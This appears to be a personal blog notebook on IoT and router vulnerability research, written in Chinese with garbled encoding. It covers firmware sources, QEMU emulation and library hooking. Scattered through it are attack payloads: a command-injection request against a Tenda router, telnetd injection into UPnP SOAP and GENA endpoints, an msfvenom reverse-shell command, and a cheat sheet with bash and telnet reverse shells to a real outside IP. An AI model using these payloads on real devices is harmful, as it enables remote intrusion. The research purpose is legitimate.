---
title: IOT æ¼æ´æŒ–æ˜è®°å½•
date: 2023-04-24 00:28:59 +0800
categories: 
tags:
  - pwn
permalink: /posts/id=62/
pin: false
published:
---

ä¸»è¦æ˜¯åœ¨å­¦ä¹ çš„è¿‡ç¨‹ä¸­è®°å½•ä¸€äº›ç¬”è®°

## èµ„æºä¸‹è½½

å„å¤§å‚å•†çš„ä¸‹è½½åœ°å€

Tenda: https://www.tenda.com.cn/download/default.html

D-Link: 

https://tsd.dlink.com.tw/

https://support.dlink.com/

https://www.dlinktw.com.tw/techsupport/AllPro.aspx

TP-Link: https://resource.tp-link.com.cn/?source=index

åä¸º: https://support.huawei.com/enterprise/zh/software/index.html

NETGEAR/ç½‘ä»¶: http://support.netgear.cn/

ASUS/åç¡•: https://www.asus.com.cn/support/download-center/

cisco/æ€ç§‘: https://software.cisco.com/download/home

linksys/é¢†åŠ¿: https://www.linksys.com/linksys-support

H3C: http://www.h3c.com/cn/Service/Document_Software/Software_Download/

FASTè¿…æ·: https://service.fastcom.com.cn/download-list.html

æ°´æ˜Ÿ: https://service.mercurycom.com.cn/download-list.html

OpenWrt: https://downloads.openwrt.org/

æµ·åº·å¨è§†: https://www.hikvision.com/cn/support/Downloads/Device-upgrade-package/

**å®˜ç½‘æ²¡æœ‰å›ºä»¶ä¸‹è½½é“¾æ¥**

åˆ°ç¬¬ä¸‰æ–¹ä¸‹è½½ https://drivers.mydrivers.com/s-0-0/h0-0-0-0-3-1-1.htm

å°ç±³: https://xiaomifirmwareupdater.com/ã€https://mirom.ezbox.idv.tw/en/

Cisco/æ€ç§‘: https://doc.lagout.org/network/Cisco/


```Bash
armel:
# 3.2.0
wget https://people.debian.org/~aurel32/qemu/armel/debian_wheezy_armel_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/armel/initrd.img-3.2.0-4-versatile
wget https://people.debian.org/~aurel32/qemu/armel/vmlinuz-3.2.0-4-versatile
# 2.6.32
wget https://people.debian.org/~aurel32/qemu/armel/debian_squeeze_armel_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/armel/initrd.img-2.6.32-5-versatile
wget https://people.debian.org/~aurel32/qemu/armel/vmlinuz-2.6.32-5-versatile

armhf:
# 3.2.0
wget https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress
wget https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress

mipsel:
# 3.2.0
wget https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta

# 2.6.32
wget https://people.debian.org/~aurel32/qemu/mipsel/debian_squeeze_mipsel_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-2.6.32-5-4kc-malta

mips:
# 3.2.0
wget https://people.debian.org/~aurel32/qemu/mips/debian_wheezy_mips_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-3.2.0-4-4kc-malta

# 2.6.32
wget https://people.debian.org/~aurel32/qemu/mips/debian_squeeze_mips_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-2.6.32-5-4kc-malta
```


## é»‘å®¢ğŸ‘´

w18åŠ«æŒæµ‹è¯•

```http
POST /goform/module?1696930571226 HTTP/1.1
Host: 192.168.0.1
Content-Length: 73
Accept: text/plain, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Content-Type: application/json
Origin: http://192.168.0.1

Referer: http://192.168.0.1/index.html?v=1576
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

Cookie: _:USERNAME:_=; W18E_user=; bLanguage=cn
Connection: close

{"setFixTools":{"networkTool":1,"hostName":"{"setFixTools":{"networkTool":1,"hostName":"$(touch /tmp/tmptmptmp)","packageSize":32}}","packageSize":32}}
```





è¿‘æºæ¸—é€

https://tttang.com/archive/1888/#toc_wifi_1

wifipumpkin3

https://www.freebuf.com/sectool/265288.html

https://www.addx.top/2023/06/30/wifi%E9%92%93%E9%B1%BC%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B0%8F%E9%97%AE%E9%A2%98/

https://lnng.top/posts/8b06.html#toc-heading-2







https://www.cnblogs.com/xs-xs/p/16329075.html

DHCP

https://blog.csdn.net/zegeai/article/details/109760837



## IOTçš„æŠ€æœ¯æ ˆğŸ“•



åˆ©ç”¨å‰



åˆ©ç”¨å
è·å–å¯†ç 

åŠ«æŒDNS





### å¤‡å¿˜å½•



git rm -r --cached /path/to/your/folder/


æ‰¾åˆ°å±é™©å‡½æ•°ä»¥åä¸€å®šè¦å…¨å±€æœç´¢ï¼Œgrep

urlç¼–ç æ„å‘³ç€å¡«å…… %25 == 

/goform/telnet

 Nginx é…ç½® internal;

```


_xstat å‡½æ•°æ˜¯ä¸€ä¸ªç”¨äºè·å–æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„è¯¦ç»†ä¿¡æ¯çš„ç³»ç»Ÿè°ƒç”¨
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

int main() {
    const char *file_path = "example.txt";
    struct stat file_stat;

    // ä½¿ç”¨ _xstat è·å–æ–‡ä»¶ä¿¡æ¯
    if (_xstat(_STAT_VER, file_path, &file_stat) == 0) {
        printf("File Size: %lld bytes\n", (long long)file_stat.st_size);
        printf("Permissions: %o\n", file_stat.st_mode & 0777);
        // å…¶ä»–æ–‡ä»¶ä¿¡æ¯...
    } else {
        perror("Error getting file information");
    }

    return 0;
}



```


### ghidraå¿«æ·é”®

L	ä¿®æ”¹æ ‡ç­¾ä¿®æ”¹åå­—


### msfç”Ÿæˆshellcode

```shell
msfvenom -p linux/mipsle/shell_reverse_tcp LHOST=192.168.55.5 LPORT=2333 -f py -o mipsel919.txt
# # ä¸æŒ‡å®š-få‚æ•°çš„è¯ï¼Œç”Ÿæˆäº†ä¸€ä¸ªshellcodeäºŒè¿›åˆ¶æ–‡ä»¶ã€‚æŒ‡å®š-f pyç”Ÿæˆçš„æ–‡ä»¶ï¼Œæ–¹ä¾¿å†™è„šæœ¬ä½¿ç”¨
# ä½¿ç”¨æ–¹æ³•å°±æ˜¯
# æº¢å‡º + shellcode_addr + xxx + shellcode

# payloadæŒ‰tabä¼šåŠ è½½

msfvenom --list payloads | grep mipsle
```


### ç¼–è¯‘tcpdump  å’Œ busybox
ä¸‹è½½tcpdumpå’Œlibpcapï¼šhttps://www.tcpdump.org/

mipselç‰ˆ
```shell
sudo apt install gcc-mipsel-linux-gnu

# libpcap
tar zxvf libpcap-1.10.4.tar.gz
./configure --host=mipsel-linux-gnu --disable-shared
make CC=mipsel-linux-gnu-gcc

# tcpdump

åœ¨tcpdump.cä¸­æ·»åŠ  #include <fcntl.h>

./configure --host=mipsel-linux-gnu CPPFLAGS="-I/home/ef4tless/libpcap-1.10.4" LDFLAGS="-L/home/ef4tless/libpcap-1.10.4/libpcap.a -static"
make

./tcpdump -i lo -w ./test.pcap

# æå–pcapåŒ…

cat /tmp/test.pcap  | /tmp/busybox-mipsel base64 

ç„¶åå¤åˆ¶base64çš„å€¼åˆ°æœ¬åœ°pcap64

cat pcap64 | base64 -d > test.pcap 
```






### mqtt
mqttä¸ubusçš„å®‰å…¨é—®é¢˜ï¼šhttps://gtrboy.github.io/posts/bus/#0x01-mqtt%E5%8D%8F%E8%AE%AE
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231226200717.png)

æ¶ˆæ¯æ€»çº¿æœºåˆ¶æœ‰MQTTåè®®ä»¥åŠubusç³»ç»Ÿã€‚å…¶ä¸­MQTTä½œä¸ºä¸€ç§åº”ç”¨å±‚åè®®ï¼Œä¸ä»…å¯ä»¥å®ç°è®¾å¤‡å’Œåº”ç”¨ï¼ˆå¦‚APPã€Webç®¡ç†ç³»ç»Ÿï¼‰ä¹‹é—´è¿œç¨‹é€šä¿¡ï¼Œä¹Ÿå¯ä»¥å°†MQTTä»£ç†å¼€æ”¾åœ¨è®¾å¤‡å†…éƒ¨å®ç°è¿›ç¨‹é—´é€šä¿¡
MQTTåè®®åŸºäºè®¢é˜…/å‘å¸ƒæ¨¡å‹

ä»£ç†å³MQTTæœåŠ¡å™¨




### soåº“çš„å¦ç±»åŠ è½½

æœ‰æ—¶å€™å¯¹åº“å‡½æ•°çš„å¼•ç”¨å¯èƒ½æ˜¯é€šè¿‡dlopen

```
dlopen(const char *filename, int flags)
```

éœ€è¦æŒ‡å®šè·¯å¾„å’Œæ–‡ä»¶åï¼Œå¦‚æœè¯´æœä¸åˆ°è°ƒç”¨soçš„æ–‡ä»¶ï¼Œæœ‰å¯èƒ½æ˜¯æ•°ç»„éå†çš„æ–¹å¼æ‹¼æ¥soæ–‡ä»¶çš„è·¯å¾„

ä¾‹å¦‚ï¼šè¦æœç´¢è°ƒç”¨lib/cste_modules/system.soçš„äºŒè¿›åˆ¶æ–‡ä»¶
å¯ä»¥æœç´¢lib/cste_modulesï¼Œç„¶åå°±èƒ½æ‰¾åˆ°æœ€æœ‰å¯èƒ½çš„è°ƒç”¨æ–‡ä»¶äº†




### /etc/passwd and /etc/shadow
```
root: $6$9w5Td6lg$bgpsy3olsq9WwWvS5Sst2W3ZiJpuCGDY.4w4MRk3ob/i85fl38RH15wzVoomff9isV1 PzdcXmixzhnMVhMxbvO:15775:0:99999:7:::


ç”¨æˆ·åï¼š             åŠ å¯†å¯†ç ï¼š         æœ€åä¸€æ¬¡ä¿®æ”¹æ—¶é—´ï¼šæœ€å°ä¿®æ”¹æ—¶é—´é—´éš”ï¼šå¯†ç æœ‰æ•ˆæœŸï¼šå¯†ç éœ€è¦å˜æ›´å‰çš„è­¦å‘Šå¤©æ•°ï¼šå¯†ç è¿‡æœŸåçš„å®½é™æ—¶é—´ï¼šè´¦å·å¤±æ•ˆæ—¶é—´ï¼šä¿ç•™å­—æ®µ
```


é‡‡ç”¨SHA512 æ•£åˆ—åŠ å¯†ç®—æ³•æˆ–è€…MD5

å¯ä»¥åœ¨https://www.cmd5.com/charge.aspxè§£å¯†

### åŠ å¯†å›ºä»¶å¤„ç†


### patch & hook

HOOKä¸€å…±æœ‰å››ç§æ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯

+ LD_PRELOAD
+ dl_open
+ LD_LIBRARY_PATH
+ ç›´æ¥é’ˆå¯¹äºŒè¿›åˆ¶æ–‡ä»¶çš„patch

```shell
# æŸ¥çœ‹libc ä¿¡æ¯
cp $(which qemu-arm-static) .
sudo chroot . ./qemu-arm-static /lib/libc.so.6
or
strings ./lib/libc.so.0 | grep uClibc
```
### dl_open

```
mv libnvram.so libnvram_orig.so

```



### LD_PRELOAD

```shell
# glibc/eglibcç¼–è¯‘ 
arm-linux-gnueabi-gcc -shared -fPIC hook.c -o hook.so 


# uclibc ç¼–è¯‘
cd ~/am-toolchains/brcm-arm-sdk/
export LD_LIBRARY_PATH="$PWD/hndtools-arm-linux-2.6.36-uclibc-4.5.3/lib"
# åŸºäº nvram_fake
./hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc -c -O2 -fPIC -Wall /home/ef4tless/nvram-faker/custom_nvram_r6250.c -o /home/ef4tless/nvram-faker/custom_nvram_r6250.o

./hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc -shared -nostdlib /home/ef4tless/nvram-faker/custom_nvram_r6250.o -o /home/ef4tless/nvram-faker/custom_nvram_r6250.so

# åŸºäº libnvram
./hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc -c -O2 -fPIC -Wall /home/ef4tless/libnvram/nvram.c -o /home/ef4tless/libnvram/firmadyne_nvram.o

./hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc -shared -nostdlib /home/ef4tless/libnvram/firmadyne_nvram.o -o /home/ef4tless/libnvram/firmadyne_libnvram.so


# ä¸Šä¼ 
scp ./hook.so root@192.168.2.2:/root/rootfs/

scp ./mini_httpd root@192.168.2.2:/root/rootfs/usr/sbin
```



```shell
# è¿è¡Œ
LD_PRELOAD=./hook.so ./usr/sbin/mini_httpd
# æ³¨å…¥ç¯å¢ƒå˜é‡
export LD_PRELOAD=./hook.so


# qemu usr mode / straceè¿½è¸ª
sudo chroot . ./qemu-arm-static ./usr/sbin/upnpd
sudo chroot . ./qemu-arm-static -strace ./usr/sbin/upnpd

sudo chroot . ./qemu-arm-static -E LD_PRELOAD="./custom_nvram_r6250.so ./lib/libdl.so.0" /usr/sbin/upnpd

sudo chroot . ./qemu-arm-static -E LD_PRELOAD="/firmadyne_libnvram.so" ./usr/sbin/upnpd



# æŸ¥çœ‹å¯åŠ¨ç«¯å£
sudo lsof -i | grep qemu


# æŒ‰å­—ç¬¦ä¸²æœç´¢
cd rootfs
grep -r "mini_httpd" ./

```




```shell
# start.sh

mipsel:
qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta \
    -hda debian_wheezy_mipsel_standard.qcow2 \
    -append "root=/dev/sda1 console=tty0" \
    -netdev tap,id=tapnet,ifname=tap0,script=no \
    -device rtl8139,netdev=tapnet -nographic
    
mips:
qemu-system-mips -M malta -kernel vmlinux-3.2.0-4-4kc-malta \
    -hda debian_wheezy_mips_standard.qcow2 \
    -append "root=/dev/sda1 console=tty0" \
    -netdev tap,id=tapnet,ifname=tap0,script=no \
    -device rtl8139,netdev=tapnet -nographic
    
armel:
qemu-system-arm \
    -M versatilepb \
    -kernel vmlinuz-3.2.0-4-versatile \
    -initrd initrd.img-3.2.0-4-versatile \
    -hda debian_wheezy_armel_standard.qcow2 \
    -append "root=/dev/sda1" -net nic \
    -net tap,ifname=tap0,script=no,downscript=no \
    -nographic

armhf:
qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress \
    -initrd initrd.img-3.2.0-4-vexpress \
    -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \
    -append "root=/dev/mmcblk0p2" -net nic \ 
    -net tap,ifname=tap0,script=no,downscript=no -nographic
    
arm64:
```



GDBè°ƒè¯•

```
# gdbserver


gdb







```



### æŒ–æ˜æŠ€å·§tipså’ŒçŸ¥è¯†ç‚¹

```sh
sudo vim /etc/ssh/sshd_config
PasswordAuthenticationæ”¹æˆyes

vsnprintf(str, 0x400u, format, va);
æŒ‰ç…§formatçš„æ ¼å¼ï¼ˆ%sï¼‰ï¼Œå°†vaä¼ å…¥str

ä¾‹å¦‚ vaæ˜¯æ ˆä¸Šåˆ—è¡¨/formatä¸º%S %S %S
+0000000C filename:.word ?
+00000010 re_addr:.word ?
+00000014 re_port:.word ?

strä¸º filename re_addr re_port

idaæŸ¥æ‰¾å­—æ®µ Alt+t

fopenå‡½æ•°çš„modeå‚æ•°æœ‰ä»¥ä¸‹å‡ ç§ï¼š
"r"ï¼šä»¥åªè¯»æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚æ–‡ä»¶å¿…é¡»å­˜åœ¨ï¼Œå¦åˆ™æ‰“å¼€å¤±è´¥ã€‚
"w"ï¼šä»¥å†™æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºæ–‡ä»¶ï¼›å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™æ¸…ç©ºæ–‡ä»¶å†…å®¹ã€‚
"a"ï¼šä»¥è¿½åŠ æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºæ–‡ä»¶ï¼›å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™åœ¨æ–‡ä»¶æœ«å°¾è¿½åŠ å†…å®¹ã€‚
"r+"ï¼šä»¥è¯»å†™æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚æ–‡ä»¶å¿…é¡»å­˜åœ¨ï¼Œå¦åˆ™æ‰“å¼€å¤±è´¥ã€‚
"w+"ï¼šä»¥è¯»å†™æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºæ–‡ä»¶ï¼›å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™æ¸…ç©ºæ–‡ä»¶å†…å®¹ã€‚
"a+"ï¼šä»¥è¯»å†™æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºæ–‡ä»¶ï¼›å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™åœ¨æ–‡ä»¶æœ«å°¾è¿½åŠ å†…å®¹ã€‚
é™¤äº†ä»¥ä¸Šå…­ç§æ¨¡å¼å¤–ï¼Œè¿˜å¯ä»¥åœ¨æ¨¡å¼å­—ç¬¦ä¸²ä¸­æ·»åŠ "b"å­—ç¬¦ï¼Œè¡¨ç¤ºä»¥äºŒè¿›åˆ¶æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œ"rb"è¡¨ç¤ºä»¥åªè¯»æ–¹å¼æ‰“å¼€äºŒè¿›åˆ¶æ–‡ä»¶ã€‚

bashè„šæœ¬`ls`å‘½ä»¤æ‰§è¡Œ
ä½¿ç”¨ && è¿æ¥ä¸¤ä¸ªå‘½ä»¤æ—¶ï¼Œç¬¬äºŒä¸ªå‘½ä»¤åªæœ‰åœ¨ç¬¬ä¸€ä¸ªå‘½ä»¤æˆåŠŸæ‰§è¡Œï¼ˆå³è¿”å›çŠ¶æ€ç ä¸º0ï¼‰ä¹‹åæ‰ä¼šæ‰§è¡Œ

ç”¨FAPå¯åŠ¨å¥½å›ºä»¶åï¼Œéœ€è¦ç”¨echo 0 > /proc/sys/kernel/randomize_va_spaceå‘½ä»¤å…³é—­åœ°å€éšæœºåŒ–ï¼ˆASLRï¼‰

# åœ¨å½“å‰ç›®å½•æŸ¥æ‰¾
grep -r "CVE-2022-45511" ./
```



hnap

upnp

```
cgibinä¼šä½œä¸º â€œè¯·æ±‚éªŒè¯æ–‡ä»¶â€ ï¼Œå¯¹ç”¨æˆ·çš„è¯·æ±‚è¿›è¡ŒéªŒè¯å¹¶è§£æï¼Œå†å°†è§£æåçš„æ•°æ®ä¼ ç»™å¯¹åº”çš„æ–‡ä»¶ï¼Œè¿›è¡Œä¸‹ä¸€æ­¥çš„æ“ä½œã€‚

SSDPï¼ˆç®€å•æœåŠ¡å‘ç°åè®®ï¼‰ï¼ŒSOAPï¼ˆç®€å•å¯¹è±¡è®¿é—®åè®®ï¼‰ä¸GENAï¼ˆé€šç”¨äº‹ä»¶é€šçŸ¥ä½“ç³»ï¼‰ ï¼Œå…¶åˆ†åˆ«å¯¹åº”ssdpcgiï¼ˆåœ¨/htdocs/upnpç›®å½•ä¸‹ï¼‰ï¼Œsoap.cgiï¼ˆåœ¨/htdocs/upnp/docs/LAN-1ç›®å½•ä¸‹ï¼‰ï¼Œgena.cgiï¼ˆåœ¨/htdocs/upnp/docs/LAN-1ç›®å½•ä¸‹ï¼‰


/usr/sbin/upnp ä¸­åˆ™åŒ…å«äº†è¯·æ±‚è§„åˆ™
```

SSDP

```
è°ƒç”¨ç«¯å£æŸ¥è¯¢
/var/run/httpd.conf



# ç§°ä¸ºHTTPUåè®®ï¼ˆå³åŸºäºUDPçš„HTTPï¼‰


M-SEARCH * HTTP / 1.1  
hostï¼š239.255.255.250 ï¼š1900  
MANï¼šssdpï¼šdiscover  
MXï¼š10  
STï¼šssdp:all

UUID
Universally Unique Identifierï¼Œé€šç”¨å”¯ä¸€è¯†åˆ«ç ã€‚ç›®çš„æ˜¯è®©åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„æ‰€æœ‰å…ƒç´ ï¼Œéƒ½æœ‰å”¯ä¸€è¾¨è¯†å’¨è¯¢ï¼Œå®šä¹‰æ ¼å¼ä¸ºï¼šxxxxxxxx-xxxx-xxxx-xxxxxxxxxxxxxxxx(8-4-4-16),åˆ†åˆ«ä¸ºå½“å‰æ—¥æœŸå’Œæ—¶é—´ï¼Œæ—¶é’Ÿåºåˆ—ï¼Œå…¨å±€å”¯ä¸€çš„IEEEæœºå™¨è¯†åˆ«å·ï¼Œå¦‚æœæœ‰ç½‘å¡ï¼Œä»ç½‘å¡macåœ°å€è·å¾—ï¼Œæ²¡æœ‰ç½‘å¡ä»¥å…¶ä»–æ–¹å¼è·å¾—ã€‚
UDN
å•ä¸€è®¾å¤‡åï¼ˆUnique Device Nameï¼‰ï¼ŒåŸºäºUUIDï¼Œè¡¨ç¤ºä¸€ä¸ªè®¾å¤‡ã€‚åœ¨ä¸åŒçš„æ—¶é—´ï¼Œå¯¹äºåŒä¸€ä¸ªè®¾å¤‡æ­¤å€¼åº”è¯¥æ˜¯å”¯ä¸€çš„ã€‚
URN
URLçš„ä¸€ç§æ›´æ–°å½¢å¼ï¼Œç»Ÿä¸€èµ„æºåç§°(URN,Uniform Resource Name)ã€‚å”¯ä¸€æ ‡è¯†ä¸€ä¸ªå®ä½“çš„æ ‡è¯†ç¬¦ï¼Œä½†æ˜¯ä¸èƒ½ç»™å‡ºå®ä½“çš„ä½ç½®ã€‚æ ‡è¯†æŒä¹…æ€§Internetèµ„æºã€‚URNå¯ä»¥æä¾›ä¸€ç§æœºåˆ¶ï¼Œç”¨äºæŸ¥æ‰¾å’Œæ£€ç´¢å®šä¹‰ç‰¹å®šå‘½åç©ºé—´çš„æ¶æ„æ–‡ä»¶ã€‚å°½ç®¡æ™®é€šçš„URLå¯ä»¥æä¾›ç±»ä¼¼çš„åŠŸèƒ½ï¼Œä½†æ˜¯åœ¨è¿™æ–¹é¢ï¼ŒURN æ›´åŠ å¼ºå¤§å¹¶ä¸”æ›´å®¹æ˜“ç®¡ç†ï¼Œå› ä¸º URN å¯ä»¥å¼•ç”¨å¤šä¸ª URLã€‚
Mx
1åˆ°5ä¹‹é—´çš„ä¸€ä¸ªå€¼ï¼Œè¡¨ç¤ºæœ€å¤§çš„ç­‰å¾…åº”ç­”çš„ç§’æ•°ã€‚
ST
Seatch Targerï¼Œè¡¨ç¤ºæœç´¢çš„èŠ‚ç‚¹ç±»å‹ã€‚

# åº”ç­”
HTTP/1.1 200 OK\r\n
CACHE-CONTROL: max-age=120\r\n
ST: uuid:75802409-bccb-40e7-8e6c-40a5ef100e92\r\n
USN: uuid:75802409-bccb-40e7-8e6c-40a5ef100e92\r\n
EXT:\r\n
SERVER: RT-N56U/3.4.3.9 UPnP/1.1 MiniUPnPd/2.0\r\n
LOCATION: http://192.168.100.1:24795/rootDesc.xml\r\n
OPT: "http://schemas.upnp.org/upnp/1/0/"; ns=01\r\n
01-NLS: 1652586384\r\n
BOOTID.UPNP.ORG: 1652586384\r\n
CONFIGID.UPNP.ORG: 1337\r\n
\r\n
```

gena

```
SUBCRIBE

request = b"SUBSCRIBE /gena.cgi?service=" + b"`telnetd -p 7777`" + b" HTTP/1.1\r\n"
request += b"Host: localhost:49152\r\n"
request += b"Callback: http:///\r\n"
request += b"NT: upnp:event\r\n"
request += b"Timeout: Second-2333\r\n\r\n"
service=åé¢çš„å†…å®¹ï¼Œå†å…ˆçœ‹åˆ°SUBCRIBEè¯·æ±‚æ–¹å¼å¯¹åº”çš„sub_41A390å‡½æ•°ï¼š
```



soap

```
from socket import *
from os import *
from time import *
 
request = b"POST /soap.cgi?service=&&telnetd -p 8888&& HTTP/1.1\r\n"
request += b"Host: localhost:49152\r\n"
request += b"Content-Type: text/xml\r\n"
request += b"Content-Length: 88\r\n"
request += b"SOAPAction: a#b\r\n\r\n"
```



### åŸºç¡€çŸ¥è¯†

windows dnsåˆ·æ–°

```shell
ipconfig /flushdns
```





### ç½‘ç»œç¼–ç¨‹

å‚è€ƒï¼šhttps://nuoye-blog.github.io/2020/05/20/6e2d1109/

`socket(2, 2, 0)` 
è°ƒç”¨åˆ›å»ºäº†ä¸€ä¸ªIPv4(AF_INETï¼Œå› ä¸ºç¬¬ä¸€ä¸ªå‚æ•°æ˜¯2)çš„æµå¼å¥—æ¥å­—(SOCK_STREAMï¼Œå› ä¸ºç¬¬äºŒä¸ªå‚æ•°æ˜¯2)ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æŒ‡å®šçš„æ˜¯ä½¿ç”¨é»˜è®¤çš„åè®®(é€šå¸¸æ˜¯TCP)ã€‚

bindç»‘å®šåˆ°servaddrï¼Œç›¸åº”çš„IPç«¯å£

```c
bind(socket_fd, (struct sockaddr*)&servaddr, sizeof(servaddr)
```

listenç›‘å¬ç«¯å£

```C
listen(socket_fd, 10)
```



connectç”¨äºè¿æ¥åˆ°æŒ‡å®šservaddrçš„

```c
connect(socket_fd, (struct sockaddr*)&servaddr, sizeof(servaddr)
```









` 0x7F000001` è¡¨ç¤ºä½¿ç”¨å›ç¯åœ°å€(127.0.0.1)





### ç—…æ¯’åˆ†æ

| Sha256   | 81f67502d9cf92a9ff03b2f3837ae1cdda7db8e9624ad82106723b520c43fe5a |
| -------- | ------------------------------------------------------------ |
| SHA1     | cc7af791ac2a977d5d6a4609fc4438085d0becd5                     |
| MD5      | 63374c5d751d2648c578b46eb6573958                             |
| æ–‡ä»¶ç±»å‹ | EXE                                                          |
| æ–‡ä»¶å¤§å° | 24.65MB                                                      |
| æ–‡ä»¶åç§° | é›†å›¢ç»ˆç«¯è‡ªæ£€å·¥å…·ç¬¬ä¸€ç‰ˆ.exe                                   |
| åŠŸèƒ½æè¿° | Sliveræœ¨é©¬                                                   |
| æŠ€æœ¯ç‰¹ç‚¹ | ç»åˆ†æè¯¥æœ¨é©¬æ˜¯ä¸€ä¸ªåŠ å£³çš„Sliverã€‚                             |

### æƒé™ç»•è¿‡

1. ç©ºå¯†ç ç»•è¿‡
åˆ©ç”¨strlenã€strcmpã€printf  \x00æˆªæ–­ï¼Œä½¿å¾—ifåˆ¤æ–­è¿”å›1

2. fopenç©ºè¯»å…¥è¿”å›ä¸º0

3. urlè§£ç åï¼Œ%00åè¾¹è¢«æˆªæ–­ï¼Œæ‹¼æ¥æ— æƒé™é™åˆ¶çš„æ¥å£å®ç°è¶Šæƒè®¿é—®

4. ç›®å½•ç©¿è¶Šï¼Œç™½åå•å­—ç¬¦ä¸²æ¯”å¯¹ï¼Œstrncasecmp()ï¼Œä¸€æ—¦å­˜åœ¨ç™½åå•è·¯å¾„æ¯”å¯¹ï¼Œå°±å¯ä»¥ç»“åˆç›®å½•ç©¿è¶Š

5. é‡ç½®å¯†ç ç»•è¿‡

6.csrf



### å‘½ä»¤æ³¨å…¥

#### å¸¸è§å±é™©å‡½æ•°
php
- system
- exec
- passthru
- shell_exec
- popen
- proc_open

python
- system
- popen
- subprocess.call
- spawn

java
- java.lang.Runtime.getRuntime().exec(command)



#### å¯æ³¨å…¥åˆ†å‰²ç¬¦å’Œæ³¨å…¥å‘½ä»¤

__å•å¼•å·è¦é—­åˆ__! å› ä¸ºå•å¼•å·ä¸­ï¼Œ\`\` å’Œ $ å’Œ ï¼›ä¸ä¼šè¢«è¯†åˆ«æ‰§è¡Œï¼ŒåŒå¼•å·åˆ†å·è¯†åˆ«ä¸äº†


```shell
#  å¯æ³¨å…¥åˆ†å‰²ç¬¦
%0a
%0d 
;
&
|
$(shell_command)
`shell_command`
{shell_command,}
```

1ã€åˆ†å·`;`åˆ†å‰²


2ã€`||` `&&` `&` `|`åˆ†å‰²

  ||(æˆ–è€…)å½“å‰é¢çš„æ‰§è¡Œå‡ºé”™æ—¶æ‰§è¡Œåé¢çš„

  &&(å’Œ)å½“å‰ä¸€æ¡å‘½ä»¤æ‰§è¡ŒæˆåŠŸåé¢çš„å‘½ä»¤æ‰ä¼šæ‰§è¡Œ

  &å°†å‰è¾¹çš„å‘½ä»¤æ”¾åœ¨åå°æ‰§è¡Œ
  
  | ç®¡é“ç¬¦  æ˜¾ç¤ºåé¢çš„å‘½ä»¤çš„æ‰§è¡Œç»“æœ

3ã€`\r\n` `%0d%a0` æ¢è¡Œ

ä¸»è¦ç”¨äºæŠ¥æ–‡é‡Œæ‹¼æ¥
%0a å³ \n
%0d å³ \r

4ã€åå¼•å·è§£æå’Œ `$()` æ›¿æ¢

å¦‚æœåœ¨ä¸€æ¡å‘½ä»¤ä¸­å‡ºç°äº†åå¼•å·ï¼Œç³»ç»Ÿä¼šé¦–å…ˆæ‰§è¡Œåå¼•å·å†…çš„å‘½ä»¤ï¼Œç„¶åå°†æ‰§è¡Œç»“æœä½œä¸ºxclibcçš„å‚æ•°

5ã€é¢å¤–çš„ä¸€äº›æ‹¼æ¥

åŒå¤§æ‹¬å·å­—ç¬¦ç»„åˆè¾“å‡º

cat {./te,st}{st,st}
to
./test test stst stst

\> ç”¨äºé‡å®šå‘ï¼Œå¦‚æœç›®æ ‡æ–‡ä»¶å·²ç»å­˜åœ¨åˆ™è¦†ç›–å…¶ä¸­çš„å†…å®¹


æ³¨å…¥å‘½ä»¤
```shell

wget dnslog.cn

telnetd

sh -c "sh -i >& /dev/tcp/150.158.144.112/1234 0>&1"\x00

```

telnetåå¼¹ï¼Œé˜²æ­¢æ²¡æœ‰telnetd

```shell
'$(mkfifo /tmp/test;telnet 192.168.45.66 6666 0</tmp/test|/bin/sh > /tmp/test)'
```

### æ­£åˆ™åˆ†æ

```php
